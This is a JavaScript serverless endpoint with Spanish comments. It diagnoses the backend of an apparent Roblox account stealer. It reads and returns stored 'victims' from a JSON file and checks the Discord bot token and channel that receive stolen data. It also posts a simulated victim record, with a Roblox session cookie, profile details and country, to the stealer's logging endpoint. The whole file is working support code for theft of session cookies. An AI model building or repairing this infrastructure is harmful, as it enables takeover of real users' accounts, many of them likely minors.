// api/diagnostico-full.js
import fs from 'fs';
import path from 'fs';

const DB_PATH = '/tmp/victims.json';

export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(204).end();
    }

    const resultados = {
        timestamp: new Date().toISOString(),
        paso1_api: { funcionando: true, mensaje: "API responde" },
        paso2_discord: { configurado: false },
        paso3_archivos: { existe: false, datos: null },
        paso4_endpoints: {},
        paso5_prueba_completa: null
    };

    // ============================================
    // PASO 2: Verificar configuración de Discord
    // ============================================
    const token = process.env.DISCORD_BOT_TOKEN;
    const channelId = process.env.DISCORD_CHANNEL_ID;
    const publicKey = process.env.DISCORD_PUBLIC_KEY;

    resultados.paso2_discord = {
        token_configurado: !!token,
        channel_configurado: !!channelId,
        public_key_configurada: !!publicKey,
        token_preview: token ? token.substring(0, 10) + '...' : null,
        channel_id: channelId || null
    };

    // ============================================
    // PASO 3: Verificar archivo de datos
    // ============================================
    try {
        if (fs.existsSync(DB_PATH)) {
            const contenido = fs.readFileSync(DB_PATH, 'utf8');
            resultados.paso3_archivos = {
                existe: true,
                datos: JSON.parse(contenido),
                tamaño: contenido.length
            };
        } else {
            resultados.paso3_archivos = { existe: false, mensaje: "No hay víctimas aún" };
        }
    } catch (e) {
        resultados.paso3_archivos = { error: e.message };
    }

    // ============================================
    // PASO 4: Probar cada endpoint
    // ============================================
    const baseUrl = `https://${req.headers.host}`;
    const endpoints = ['/api/log', '/api/interaction', '/api/commands', '/api/guardar'];
    
    for (const endpoint of endpoints) {
        try {
            const testResponse = await fetch(`${baseUrl}${endpoint}`, {
                method: 'OPTIONS'
            });
            resultados.paso4_endpoints[endpoint] = {
                ok: testResponse.ok,
                status: testResponse.status,
                cors: testResponse.headers.get('access-control-allow-origin') === '*'
            };
        } catch (e) {
            resultados.paso4_endpoints[endpoint] = { error: e.message };
        }
    }

    // ============================================
    // PASO 5: Prueba completa con datos simulados
    // ============================================
    const testId = `test_${Date.now()}`;
    const testData = {
        roblox: {
            username: "Usuario_Test",
            userId: testId,
            robux: 9999,
            seguidores: 5000,
            amigos: 1000,
            premium: "Sí",
            verified: "Sí",
            headless: "Sí",
            korblox: "No"
        },
        cookie: "COOKIE_TEST_123456",
        pais: "Argentina",
        fecha: "10/03/2026",
        hora: "15:30:22",
        userAgent: "Mozilla/5.0 (Test)"
    };

    try {
        // Enviar a /api/log
        const logResponse = await fetch(`${baseUrl}/api/log`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(testData)
        });
        const logResult = await logResponse.json();

        // Verificar que se guardó
        const guardarResponse = await fetch(`${baseUrl}/api/guardar?userId=${testId}`);
        const guardarResult = await guardarResponse.json();

        // Probar simulación de interacción
        const interactionTest = {
            type: 3,
            data: { custom_id: `roblox_${testId}` }
        };
        
        resultados.paso5_prueba_completa = {
            log_js: { ok: logResponse.ok, resultado: logResult },
            guardado: { existe: !!guardarResult, datos: guardarResult },
            interaction_simulada: "Para probar interaction.js necesitas POST con firma de Discord",
            testId: testId
        };
    } catch (e) {
        resultados.paso5_prueba_completa = { error: e.message };
    }

    // ============================================
    // Devolver resultados
    // ============================================
    res.status(200).json(resultados);
}